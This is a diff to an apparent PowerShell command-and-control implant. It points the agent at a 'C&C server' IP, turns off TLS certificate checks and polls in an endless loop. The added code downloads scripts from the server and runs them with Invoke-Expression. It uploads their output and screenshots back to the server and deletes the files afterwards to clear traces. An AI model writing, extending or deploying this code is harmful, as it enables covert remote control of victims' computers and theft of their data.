@@ -29,6 +29,10 @@ v0.3
     - Fixed requests to not go to ServerRequirements, instead it's in a single directory (known by server) .. so just go to <IP>:<port> for commands. Everything will be placed in that same directory (root of 'web server'). Everything will be handled by web server
     - Added comments
 
+v0.4
+    - Added ability to run scripts
+    - Cleaned screenshots and scripts now delete files saved to disk after uploading
+
 END COMMENTS # LEAVE THIS.. needed for config.py
 #>
 
@@ -63,7 +67,7 @@ Add-Type @"
 # Add Global Variables here
 [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-$ccserver = "192.168.9.4:80" # IP of C&C server
+$ccserver = "192.168.9.4:8080" # IP of C&C server
 $web = New-Object System.Net.WebClient
 $Path = $env:UserProfile + "\AppData\Local\Temp\" # Path of Temp in UserProfile
 $commandPath = $Path + "command.txt" # Command.txt of Path of temp
@@ -154,7 +158,7 @@ elseif($Indicator -eq '2' -And $PreviousCommand -ne $CurrentCommand) {
 
 } 
 ###########
-## 3 - DOWNLOAD A FILE
+## 3 - DOWNLOAD A FILE FROM CNC and save to local directory
 ###########
 elseif($Indicator -eq '3' -And $PreviousCommand -ne $CurrentCommand) {
 #if($Indicator -eq '3') {
@@ -205,12 +209,58 @@ elseif($Indicator -eq '4' -And $PreviousCommand -ne $CurrentCommand){
     
     # Necessary to wait for next instruction
     Start-Sleep -s 5
+
+    rm $CaptureFile
 }
 ######
-# 5 - ENUNMERATION
+# 5 - RUN SCRIPTS (Download from Server, run, 
 # TODO: NEED TO INCORPORATE
 ######
 elseif($Indicator -eq '5' -And $PreviousCommand -ne $CurrentCommand){
+    write-host "Let's run a script"
+    write-host "Downloading script..."
+    $CurrentCommand | out-file -filepath $commandPath -NoNewLine
+
+    # Perform Command and save to variable
+    $CommandOutput = $web.DownloadFile("https://$ccserver/$CurrentCommand", $CurrentCommand)
+    
+    # Necessary to wait for next instruction
+    Start-Sleep -s 5
+
+    # Now that the file is downloaded, run it
+    #$output = 'jaws-output.txt'
+    $script = ('.\' + $CurrentCommand)
+
+    write-host "Let's run.. " + $script
+    Invoke-Expression -Command $script 
+
+    # Sleep for 10 seconds to ensure script completes
+    write-host "Sleeping for 10.."
+    Start-Sleep -s 10
+
+    write-host "Sending output back to command server.."
+
+    # TAKEN FROM #2..
+    write-host "Time to upload a file!"
+    #$CurrentCommand | out-file -filepath $commandPath -NoNewLine
+    $ScriptOutput = "ScriptOutput.txt"
+    write-host "File to get is:" $ScriptOutput
+    $body = "$(get-content $ScriptOutput -raw)"
+    $respond = $web.UploadString("https://$ccserver", $body)
+    $StatusCode = $Response.StatusCode
+    $StatusCode
+
+    Start-Sleep -s 10
+    rm $script
+    rm $ScriptOutput
+
+
+}
+########
+# 6 - ENUMERATE
+# TODO: Need to incorporate
+#########
+elseif($Indicator -eq '6' -And $PreviousCommand -ne $CurrentCommand){
     write-host "Let's enumerate"
 }
 #########
@@ -227,4 +277,5 @@ else {
 Start-Sleep -s 5
 
 } # End infinit loop
+
 
